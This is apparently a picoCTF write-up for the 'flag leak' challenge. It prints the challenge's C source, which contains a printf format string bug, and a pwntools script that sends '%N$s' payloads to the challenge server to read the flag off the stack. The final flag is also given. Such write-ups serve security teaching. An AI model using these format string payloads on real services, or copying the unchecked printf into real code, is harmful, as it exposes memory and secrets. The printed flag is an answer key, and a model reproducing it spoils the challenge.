# flag leak
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Story telling class 1/2 
I'm just copying and pasting with this [program](https://github.com/jon-brandy/CTF-WRITE-UP/blob/0782a0d972e244a18c82cbc1c62c2d363bef0c61/Asset/flag%20leak/vuln). what can go wrong? You can view source [here](https://github.com/jon-brandy/CTF-WRITE-UP/blob/0782a0d972e244a18c82cbc1c62c2d363bef0c61/Asset/flag%20leak/vuln.c). 
And connect with it using: `nc saturn.picoctf.net 63788`
## HINT:
1. Format Strings
## STEPS:
1. First, download both files given.
2. Next, let's check the `program`'s file type.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/189511862-1198436f-b5f9-4742-ac12-504e6a9905a4.png)

3. Notice, it's a 32 bit file and not stripped, so we can see the functions name
4. Now check the file protection.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/189511913-7206d52a-f6da-4424-afa0-76d84d31a802.png)

5. **No canary found** and **no pie**. So they will keep the same memory location.
6. Now let's run the program but make it executable first by run -> `chmod +x vuln`.

> RUN

![image](https://user-images.githubusercontent.com/70703371/189511953-8c084cba-c734-4129-940c-7e4a117602fa.png)

7. Let's create `flag.txt` file first, then run the program again.

![image](https://user-images.githubusercontent.com/70703371/189511980-4beb33e4-5c09-4b38-81d2-24d07714d14c.png)

![image](https://user-images.githubusercontent.com/70703371/189512037-78b9c5a6-0361-4196-9105-95ee2676d144.png)


8. Hmm let's analyze the source code.

> VULN.C

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

9. Based from the hint, the vuln is right here.

![image](https://user-images.githubusercontent.com/70703371/189512352-4d32c0ce-1a45-4283-a707-b42eb5506808.png)

10. We can exploit that, for example i input `%x`.

> %x

![image](https://user-images.githubusercontent.com/70703371/189512371-6a223b61-821e-421e-a488-fbb88c209726.png)

11. Maybe with a delimiter, since the `scanf` function does not specify the `%[^\n]`.

> WITH DELIMITER

![image](https://user-images.githubusercontent.com/70703371/189512570-b094ecb1-f917-4284-843e-e941d52f4928.png)


12. But the memory addresses we recieve is the `%x.%`, which is our input.

> USING PWNTOOLS

```py
from pwn import *

value = p32(0x252e7825)
print(value)
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/189512608-4aad9a0d-a14d-461c-b4b9-a22047626236.png)

13. Also notice here, few memory addresses are repeated.
14. Since it's a stack, maybe we can climb up to the `flag` variable.
15. So let's input our own local flag.

> I INPUT bctf{FLAG} at flag.txt

16. Run the program again, but this time input the `%x` with delimiter as many as you want until you see a different address pattern.

> RUN

![image](https://user-images.githubusercontent.com/70703371/189512833-307357b3-eed3-40e5-9fa6-aadcad688aba.png)

17. We got different address pattern now.

![image](https://user-images.githubusercontent.com/70703371/189512842-bc917436-4fb8-4160-95c5-85c2efbbdf33.png)

18. Let's copy the first memory address of the newly created pattern and convert it to strings using [this](https://www.rapidtables.com/convert/number/hex-to-decimal.html) online tools

> USING ONLINE TOOLS

![image](https://user-images.githubusercontent.com/70703371/189513131-a30687d8-a034-4745-a1fd-ce26ff10f7d6.png)

19. It must be our local flag then.
20. The conclusion is, this is a `FORMAT STRINGS ATTACK`.
21. For this solution, i made a python script to do the format strings attack.

```py
from pwn import *
import os

os.system('clear')

for i in range(256): # 128 + 64 + 64
    sh = remote('saturn.picoctf.net', 63788)
    sh.recvuntil(b'>')
    sh.sendline('%' + str(i) + '$s')
    print(sh.recvuntil(b'-')) 
    print(i) # print the iteration
    print(sh.recv()) # print the value
    
    sh.close # close the session if i == 255
```

22. At the 24th iteration we got the flag!

![image](https://user-images.githubusercontent.com/70703371/189513593-259e30b4-05f4-4925-8ab4-994d8f65f62c.png)


## FLAG

```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}
```



## LEARNING REFERENCES:

```
https://owasp.org/www-community/attacks/Format_string_attack
```



